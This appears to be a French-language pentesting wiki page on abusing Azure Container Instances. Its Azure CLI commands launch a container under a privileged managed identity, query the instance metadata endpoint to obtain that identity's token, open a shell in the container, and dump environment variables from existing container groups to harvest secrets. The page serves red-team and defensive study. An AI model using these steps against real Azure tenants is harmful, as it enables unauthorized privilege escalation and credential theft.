---
title: "Container Instances : exécuter un conteneur sous une identité attachée"
order: 4
description: "Abuser d'Azure Container Instances pour exécuter un conteneur sous une identité managée attachée ou lire son environnement."
keywords:
  - ACI
  - Container Instances
  - identité managée
  - conteneur
  - environnement
---

# Container Instances

Azure Container Instances (ACI) exécute un conteneur unique sans cluster. Créer un groupe de conteneurs doté d'une **identité managée assignée** vous donne une exécution de code qui détient le jeton de cette identité, et lire la définition d'un groupe existant expose ses variables d'environnement, lieu courant de stockage des secrets.

## Exécuter un conteneur sous une identité choisie

```bash
az container create -g <rg> -n evil --image <registry>.azurecr.io/x \
  --assign-identity <userAssignedIdentityId> --command-line "/bin/sh -c 'curl -s -H Metadata:true http://169.254.169.254/...'"
az container exec -g <rg> -n evil --exec-command "/bin/sh"
```

## Lire un groupe existant

```bash
az container show -g <rg> -n <group> --query "containers[].environmentVariables"
```

## Notes d'exploitation

- La voie `--assign-identity` reflète l'escalade par identité managée des VM : attachez une identité assignée par l'utilisateur privilégiée, puis générez son jeton depuis l'intérieur du conteneur.
- Les variables d'environnement et les partages Azure File montés sur des groupes existants portent fréquemment des chaînes de connexion et des clés.

## Outils

- **Azure CLI** (`az container create`, `az container exec`, `az container show`).

## Références

- [Microsoft : identité managée ACI](https://learn.microsoft.com/azure/container-instances/container-instances-managed-identity)
- [HackTricks Cloud : Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
